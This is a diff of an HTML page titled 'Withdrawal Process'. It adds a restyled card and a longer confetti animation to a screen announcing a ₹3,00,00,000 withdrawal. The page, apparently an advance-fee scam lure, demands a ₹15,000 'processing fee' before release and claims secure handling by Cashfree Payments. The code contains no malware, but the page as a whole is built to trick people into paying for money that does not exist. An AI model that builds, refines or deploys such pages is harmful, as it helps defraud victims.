@@ -1,98 +1,143 @@
 <!DOCTYPE html>
 <html lang="en">
 <head>
-    <meta charset="UTF-8">
-    <meta name="viewport" content="width=device-width, initial-scale=1.0">
-    <title>Withdrawal Process</title>
-    <style>
-        * {
-            margin: 0;
-            padding: 0;
-            box-sizing: border-box;
-        }
-        body {
-            height: 100vh;
-            background-color: #f2f2f2;
-            display: flex;
-            justify-content: center;
-            align-items: center;
-            font-family: 'Arial', sans-serif;
-        }
-        .container {
-            background: #fff;
-            padding: 30px 20px;
-            border-radius: 15px;
-            box-shadow: 0 8px 20px rgba(0,0,0,0.15);
-            text-align: center;
-            width: 90%;
-            max-width: 450px;
-        }
-        .container h1 {
-            font-size: 24px;
-            margin-bottom: 15px;
-            color: #222;
-        }
-        .amount {
-            font-size: 28px;
-            color: #00aa00;
-            font-weight: bold;
-            margin-bottom: 20px;
-        }
-        .info-text {
-            font-size: 16px;
-            color: #333;
-            margin-bottom: 10px;
-        }
-        .important {
-            color: red;
-            font-weight: bold;
-            margin: 10px 0 20px 0;
-            font-size: 16px;
-        }
-        .pay-button {
-            background-color: #028a0f;
-            color: white;
-            padding: 15px;
-            width: 100%;
-            font-size: 18px;
-            border: none;
-            border-radius: 8px;
-            cursor: pointer;
-            transition: background 0.3s;
-        }
-        .pay-button:hover {
-            background-color: #026d0c;
-        }
-        .payment-info {
-            font-size: 13px;
-            color: #777;
-            margin-top: 15px;
-        }
-    </style>
+  <meta charset="UTF-8" />
+  <meta name="viewport" content="width=device-width, initial-scale=1.0"/>
+  <title>Withdrawal Process</title>
+  <style>
+    body {
+      margin: 0;
+      padding: 0;
+      font-family: 'Segoe UI', Tahoma, Geneva, Verdana, sans-serif;
+      background-color: #f1f1f1;
+      overflow: hidden;
+    }
+
+    .container {
+      height: 100vh;
+      width: 100vw;
+      padding: 20px;
+      display: flex;
+      justify-content: center;
+      align-items: flex-start;
+    }
+
+    .card {
+      width: 100%;
+      max-width: 450px;
+      background: #fff;
+      padding: 24px 20px;
+      border-radius: 18px;
+      box-shadow: 0 8px 24px rgba(0,0,0,0.15);
+      margin-top: 40px;
+      position: relative;
+      z-index: 1;
+    }
+
+    .card h1 {
+      font-size: 24px;
+      margin-bottom: 10px;
+      text-align: center;
+    }
+
+    .card .amount {
+      font-size: 28px;
+      color: green;
+      font-weight: bold;
+      text-align: center;
+      margin-bottom: 18px;
+    }
+
+    .card p {
+      font-size: 16px;
+      text-align: center;
+      color: #444;
+    }
+
+    .card .red {
+      color: red;
+      font-weight: bold;
+      margin-top: 10px;
+    }
+
+    .card button {
+      margin-top: 22px;
+      width: 100%;
+      background-color: #05a505;
+      color: white;
+      border: none;
+      border-radius: 10px;
+      padding: 14px;
+      font-size: 17px;
+      font-weight: 500;
+      cursor: pointer;
+    }
+
+    .card button:hover {
+      background-color: #038803;
+    }
+
+    .card .note {
+      font-size: 13px;
+      text-align: center;
+      margin-top: 14px;
+      color: #888;
+    }
+
+    canvas {
+      position: fixed;
+      top: 0;
+      left: 0;
+      width: 100vw !important;
+      height: 100vh !important;
+      z-index: 0;
+      pointer-events: none;
+    }
+  </style>
 </head>
 <body>
+  <canvas id="confetti-canvas"></canvas>
+  <div class="container">
+    <div class="card">
+      <h1>Withdrawal Process</h1>
+      <div class="amount">₹3,00,00,000</div>
+      <p>To complete your withdrawal, you need to pay a processing fee of ₹15,000.</p>
+      <p class="red">Your withdrawal will be processed only after successful payment.</p>
+      <button>Pay Now ₹15,000</button>
+      <p class="note">Payment will be processed securely via Cashfree Payments</p>
+    </div>
+  </div>
 
-<div class="container">
-    <h1>Withdrawal Process</h1>
-    <div class="amount">₹3,00,00,000</div>
-    <p class="info-text">To complete your withdrawal, you need to pay a processing fee of ₹15,000.</p>
-    <p class="important">Your withdrawal will be processed only after successful payment.</p>
-    
-    <button class="pay-button">Pay Now ₹15,000</button>
-    <p class="payment-info">Payment will be processed securely via Cashfree Payments</p>
-</div>
+  <!-- Confetti JS -->
+  <script src="https://cdn.jsdelivr.net/npm/canvas-confetti@1.5.1/dist/confetti.browser.min.js"></script>
+  <script>
+    const canvas = document.getElementById('confetti-canvas');
+    const myConfetti = confetti.create(canvas, {
+      resize: true,
+      useWorker: true
+    });
 
-<!-- Confetti JS -->
-<script src="https://cdn.jsdelivr.net/npm/canvas-confetti@1.5.1/dist/confetti.browser.min.js"></script>
-<script>
-    window.onload = function() {
-        confetti({
-            particleCount: 150,
-            spread: 80,
-            origin: { y: 0.6 }
-        });
-    };
-</script>
+    const duration = 3 * 1000; // 3 seconds
+    const end = Date.now() + duration;
 
+    (function frame() {
+      myConfetti({
+        particleCount: 5,
+        angle: 60,
+        spread: 55,
+        origin: { x: 0 }
+      });
+      myConfetti({
+        particleCount: 5,
+        angle: 120,
+        spread: 55,
+        origin: { x: 1 }
+      });
+
+      if (Date.now() < end) {
+        requestAnimationFrame(frame);
+      }
+    })();
+  </script>
 </body>
 </html>
